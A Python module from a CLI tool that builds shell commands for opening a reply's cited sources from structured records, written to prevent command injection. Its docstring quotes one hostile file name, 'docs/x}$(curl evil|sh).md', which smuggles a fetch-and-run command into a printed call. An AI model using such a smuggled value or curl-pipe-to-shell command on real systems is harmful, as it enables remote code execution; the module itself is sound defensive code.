"""The commands that open a reply's cited sources, built from its source records.

A reply names how to read a source in text (``read_file <id>``, ``read with
integrations command='call' tool='...' arguments={...}``, a ``fetch:`` line),
and that text sits beside what other people wrote: the file's path, the note's
title, an excerpt. ``beakr kb`` used to find the call in the rendered line with
a pattern that stopped at the first ``}``; a synced file named
``docs/x}$(curl evil|sh).md`` then printed as ``--args '{..."docs/x}'$(curl
evil|sh).md", ...}``, which runs when pasted (review 2026-11-13).

So a command is never read out of a rendered line here. It is built from the
structured record the reply carries (``location.file_id``, ``retrieval.tool``
and ``retrieval.arguments``), and the rendered text is only where it is placed:

- :func:`marked_sources` hands the renderer records whose file id and tool
  name are stand-ins of the same length, each holding a NUL, which no other
  text of the reply can hold (it is stripped from all of it). What the renderer
  prints around a stand-in is therefore the renderer's own, and
  :func:`place_commands` replaces exactly that with the command.
- :func:`source_lines` gives, for a listing that prints its own ``fetch:`` and
  ``read:`` lines, each whole line the records account for and its command. A
  line no record accounts for stays as the door wrote it.

Where a call exists only as text in the door's guidance (a ``next`` step),
:func:`text_integration_calls` reads it: the tool must be one of the provider
read tools, the arguments must parse as one JSON object of plain values, and
the whole of it is serialised again and quoted. Anything else stays as written.
"""

from __future__ import annotations

import json
import re
from collections.abc import Callable, Iterable, Mapping
from typing import Any

from beakr_cli.kb_shell_commands import shell_quote
from beakr_cli.source_records import READ_TOOLS
from beakr_cli.terminal_text import unprintable

__all__ = [
    "integration_command",
    "marked_sources",
    "place_commands",
    "source_lines",
    "text_integration_calls",
    "without_marks",
]

_IDENTIFIER = re.compile(r"[A-Za-z_][A-Za-z0-9_]*")
_UUID = re.compile(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}")
_MARK = re.compile(r"\x00(\d+)\x00")
_DECODER = json.JSONDecoder()
_TEXT_CALL = re.compile(r"integrations command='call' tool='(?P<tool>[A-Za-z_][A-Za-z0-9_]*)' ")
_ARGUMENTS = "arguments="


def integration_command(tool: Any, arguments: Any) -> str | None:
    """``beakr integrations call <tool> --args '<json>'``, or None when it cannot be printed.

    The tool is a plain identifier, the arguments one object of named plain
    values, and nothing in them is a character a terminal hides. The JSON is
    serialised here and quoted whole, so no part of a value is outside the quotes.
    """
    if not isinstance(tool, str) or not _IDENTIFIER.fullmatch(tool):
        return None
    if not isinstance(arguments, Mapping) or not arguments:
        return None
    for name, value in arguments.items():
        if not isinstance(name, str) or not _IDENTIFIER.fullmatch(name):
            return None
        if value is not None and not isinstance(value, (str, int, float, bool)):
            return None
    if unprintable(dict(arguments)):
        return None
    body = json.dumps(dict(arguments), ensure_ascii=False)
    return f"beakr integrations call {tool} --args {shell_quote(body)}"


def _file_command(file_id: Any) -> str | None:
    if not isinstance(file_id, str) or not _UUID.fullmatch(file_id):
        return None
    return f"beakr documents read {file_id}"


# ---------------------------------------------------------------------------
# The Sources list the CLI renders
# ---------------------------------------------------------------------------


def without_marks(value: Any) -> Any:
    """``value`` with the NUL a stand-in is made of removed from every string in it."""
    if isinstance(value, str):
        return value.replace("\x00", "")
    if isinstance(value, dict):
        return {without_marks(key): without_marks(item) for key, item in value.items()}
    if isinstance(value, list):
        return [without_marks(item) for item in value]
    return value


def _stand_in(index: int, length: int) -> str | None:
    """A stand-in as long as the text it replaces, so the renderer's size limits cut the same."""
    digits = length - 2
    if digits < len(str(index)):
        return None
    return f"\x00{index:0{digits}d}\x00"


def marked_sources(sources: Any) -> tuple[list[Any], dict[str, str]]:
    """``sources`` for the renderer, and what to put where it prints each stand-in.

    The second value maps text the renderer prints (``read_file <stand-in>``,
    the whole ``integrations ...`` call around a stand-in, and last each bare
    stand-in) to what belongs there: the command built from the record, or the
    text the reply really carried when the record gives no command.
    """
    records = without_marks(sources) if isinstance(sources, list) else []
    placed: dict[str, str] = {}
    stood_for: dict[str, str] = {}
    stand_ins: dict[str, str] = {}

    def stand_in(key: str, original: str) -> str | None:
        if key not in stand_ins:
            made = _stand_in(len(stand_ins), len(original))
            if made is None:
                return None
            stand_ins[key] = made
            stood_for[made] = original
        return stand_ins[key]

    for record in records:
        if not isinstance(record, dict):
            continue
        location = record.get("location")
        file_id = location.get("file_id") if isinstance(location, dict) else None
        if isinstance(file_id, str) and file_id:
            mark = stand_in(f"file:{file_id}", file_id)
            if mark is not None:
                location["file_id"] = mark
                placed[f"read_file {mark}"] = _file_command(file_id) or f"read_file {file_id}"
        retrieval = record.get("retrieval")
        if not isinstance(retrieval, dict):
            continue
        tool, arguments = retrieval.get("tool"), retrieval.get("arguments")
        if not isinstance(tool, str) or not isinstance(arguments, dict) or not arguments:
            continue
        # As the renderer serialises them (`mcp_render._read_call`).
        printed = json.dumps(arguments, sort_keys=True)
        mark = stand_in(f"tool:{tool}:{printed}", tool)
        if mark is None:
            continue
        retrieval["tool"] = mark
        lead, rest = "integrations command='call' tool='", f"' arguments={printed}"
        placed[lead + mark + rest] = integration_command(tool, arguments) or lead + tool + rest
    # A stand-in the renderer printed anywhere else: what it stood for, unchanged.
    return records, {**placed, **stood_for}


def place_commands(rendered: str, placed: Mapping[str, str]) -> str:
    """``rendered`` with each stand-in's text replaced by what belongs there."""
    for needle, replacement in placed.items():
        rendered = rendered.replace(needle, replacement)
    return _MARK.sub("", rendered)


# ---------------------------------------------------------------------------
# A listing's own `fetch:` and `read:` lines
# ---------------------------------------------------------------------------


def _retrievals(sources: Iterable[Any]) -> Iterable[tuple[str, dict[str, Any]]]:
    for record in sources:
        retrieval = record.get("retrieval") if isinstance(record, dict) else None
        if not isinstance(retrieval, dict):
            continue
        tool, arguments = retrieval.get("tool"), retrieval.get("arguments")
        if isinstance(tool, str) and isinstance(arguments, dict) and arguments:
            yield tool, arguments


def source_lines(sources: Any) -> dict[str, str]:
    """Each ``fetch:`` or ``read:`` line the reply's records account for, with its command.

    Keyed by the whole line as the door prints it, without its indent, in each
    of the door's spellings (``<tool> with name=value, ...`` and the
    ``integrations`` call). The command is built from the record, never from
    the line, so a line that is not exactly one of these is not a command.
    """
    lines: dict[str, str] = {}
    unclear: set[str] = set()

    def add(line: str, command: str) -> None:
        # Two records that print the same line for different calls: neither.
        if lines.setdefault(line, command) != command:
            unclear.add(line)

    records = sources if isinstance(sources, list) else []
    for tool, arguments in _retrievals(records):
        command = integration_command(tool, arguments)
        if command is None:
            continue
        pairs = ", ".join(f"{name}={value}" for name, value in arguments.items())
        add(f"fetch: {tool} with {pairs}", f"fetch: {command}")
        for printed in (json.dumps(arguments, sort_keys=True), json.dumps(arguments)):
            call = f"integrations command='call' tool='{tool}' arguments={printed}"
            add(f"fetch: {call}", f"fetch: {command}")
    for record in records:
        location = record.get("location") if isinstance(record, dict) else None
        file_id = location.get("file_id") if isinstance(location, dict) else None
        command = _file_command(file_id)
        if command is not None:
            add(f"read: read_file with artifact_id={file_id}", f"read: {command}")
    return {line: command for line, command in lines.items() if line not in unclear}


# ---------------------------------------------------------------------------
# A call that exists only as text, in the door's guidance
# ---------------------------------------------------------------------------


def text_integration_calls(
    text: str,
    keep: Callable[[str], str],
    *,
    skip: Callable[[str, int], bool] = lambda text, position: False,
) -> str:
    """``text`` with each ``integrations command='call' ...`` it names as its command.

    ``keep`` takes the command and returns what stands for it in the text;
    ``skip`` says whether a place in the text is one where no call is read (a
    quoted title). A call is read only when its tool is a provider read tool
    and its arguments parse as one JSON object; one that does not is left
    exactly as written.
    """
    out, position = [], 0
    for match in _TEXT_CALL.finditer(text):
        if match.start() < position or not text.startswith(_ARGUMENTS, match.end()):
            continue
        if skip(text, match.start()):
            continue
        start = match.end() + len(_ARGUMENTS)
        try:
            arguments, end = _DECODER.raw_decode(text, start)
        except ValueError:
            continue
        command = (
            integration_command(match["tool"], arguments) if match["tool"] in READ_TOOLS else None
        )
        if command is None:
            continue
        out.append(text[position : match.start()] + keep(command))
        position = end
    return "".join(out) + text[position:]
